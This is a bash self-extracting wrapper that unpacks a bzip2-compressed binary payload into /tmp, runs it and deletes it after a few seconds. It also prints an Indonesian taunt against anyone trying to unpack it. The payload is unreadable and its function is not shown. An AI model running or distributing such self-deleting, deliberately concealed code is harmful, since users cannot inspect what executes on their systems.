#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�q�u �_�}�����߮����PD@  `        8h �A�0@4���2 b� ��hCM2��L����� h4 ��L�hh�  h � �� 44� 4�� 8h �A�0@4���2 b���&&���hLL�𧒞�$�{"��D�1FLg��b&S(�^ץ�}��}�{��,^������ѥ�T���2QbY.Qr����2~/���d��"�䵤�go>����ޗ̱����S����H���E�5�iz芖(�}����z��Ke7?��/�[%M�j��ߚ�T��*��q-J5=�oB���k�^�K���/u(�o2\��;�ܹs����3B_j�wB��BU�5%��3,|o{�F�3�J�"�+�D�0EG;�f|+V{39{�D�Q�8�;MmO��8_�S���:s:�E�	#�"=d�z[�<�:UgA	JR�=��/��}J?rR�TvX�RLR��V��(w[?�=���5��݅����k3Ė׽D;�bڡ�:;��З��T��S�Q�%��4��<b�nC��W�����`�.'�Z��X����v����4#��Ai�!��=mn��V��>�<�|;k(�(м��p��d��2��h�?%&*�}j��aZ]�(��gz�1m`��;Cԏ�����=�0J,K�����B�
�x��Bǩ�y�4+*(��R���*_
Ī%�{���ˑ�=�3����Z����%.��J�f�j�Z��T�G$/gQ�օ�X��I\��h��R�iGֈd�鐭��`��i~�3�̹ƣ�hZ�8L,`�N�U�<-���f^�Ε.n*~��'I{�['#32�S��kp8(T{���,Eg��(Q��^'���<%g�P��-QD��xU�\�':"��w˸�{��S�bG���;��.<-��$��V֓b>����t��zJ�O��.b�,��й��F�2Q��P�BNy���Z`�ٝ��VvU.K}��Җ�J�7��ak��c��ZIZ���P�-.�,J�J�{W��~����D�)$�R���L��U�u����0bu�Mk%���zԕ�v	o7�V���G�t6�|���6:�sAs�66�69j�[�Dg%(��s��׭6��p�H%<�Q��+[�ܧ�ص��r��R���E��R+nbЗ�F+�R���݃Kc��&��t6��1s��0t���Fℕ!E��+��wY��q��#;��ZQ�T�+.x���S2��r�R��b�K���W��R*JEL��奉"��J�y+J��#y�@�vT��r"�y��K�^�5�V.w��r��F���t�j$�QD�o�T�s�u�%�$�c�vU;�W�����X�v���r���Π��5�ط�mG!���31/lr�H�֗	B�ȩ�ijQ/Z���iQ�&�L�z��-hKj�,�ƥ��2ᐣ$����`%Z䶯id���8v��,6(�D^����VD��x��P�Y:���1mjjC�y1u�v�d��c��+hu���;���U��V�*8������ꛟ�^T�v+LY(8܏�k�ʜ����D5<�+��x��*�X���A	@�$��dz^��XXB(ID�" gBD�Q�ܑN$<�p�@